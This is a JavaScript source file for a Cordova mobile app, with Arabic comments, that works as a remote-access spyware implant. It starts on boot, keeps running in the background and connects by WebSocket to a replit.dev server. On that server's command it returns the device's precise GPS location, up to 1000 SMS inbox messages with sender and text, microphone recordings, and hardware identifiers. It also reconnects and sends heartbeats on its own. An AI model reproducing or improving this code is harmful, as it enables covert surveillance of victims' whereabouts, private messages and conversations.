document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];
let reconnectInterval = null;

function onDeviceReady() {
  console.log('Device is ready');

  // تشغيل التطبيق تلقائياً بعد إعادة تشغيل الجهاز
  if (cordova.plugins.autoStart) {
    cordova.plugins.autoStart.enable();
    console.log("Autostart Enabled ✅");
  }

  // تمكين التشغيل في الخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      silent: false
    });
    console.log("Background Mode Enabled ✅");
  }

  // تفعيل جلب البيانات في الخلفية حتى عند الخروج من التطبيق
  if (window.BackgroundFetch) {
    BackgroundFetch.configure(
      {
        minimumFetchInterval: 15,
        stopOnTerminate: false,
        startOnBoot: true
      },
      () => {
        console.log("Background Fetch Triggered ✅");
        connectToServer(deviceInfo);
        BackgroundFetch.finish();
      },
      error => console.log("Background Fetch failed:", error)
    );
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };

  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);

      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }

  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };

      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }

  // إعادة الاتصال عند استئناف التطبيق
  document.addEventListener('resume', () => {
    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
      console.log('App resumed, reconnecting...');
      connectToServer(deviceInfo);
    }
  }, false);
}

function connectToServer(deviceInfo) {
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  console.log("Connecting to server...");

  if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
    console.log("Already connected ✅");
    return;
  }

  window.wsConnection = new WebSocket(wsUrl);

  wsConnection.onopen = () => {
    console.log('Connected to server ✅');

    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };

  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);

      if (data.type === 'command') {
        console.log('Received command:', data.command);

        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString()
        });

        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }

    } catch (error) {
      console.error('Error processing message:', error);
    }
  };

  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };

  wsConnection.onclose = () => {
    console.warn('Disconnected from server ❌');
    // إعادة الاتصال بعد 5 ثوانٍ
    if (reconnectInterval) clearTimeout(reconnectInterval);
    reconnectInterval = setTimeout(() => connectToServer(deviceInfo), 5000);
  };

  // إرسال نبضات قلبية للحفاظ على الاتصال
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);

  const commandId = Date.now();

  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    default:
      callback({
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };

      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }

  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };

  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10;

  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };

  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];

      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);

        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);

        callback({
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };

      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(fileName, blob) {
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };

  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}
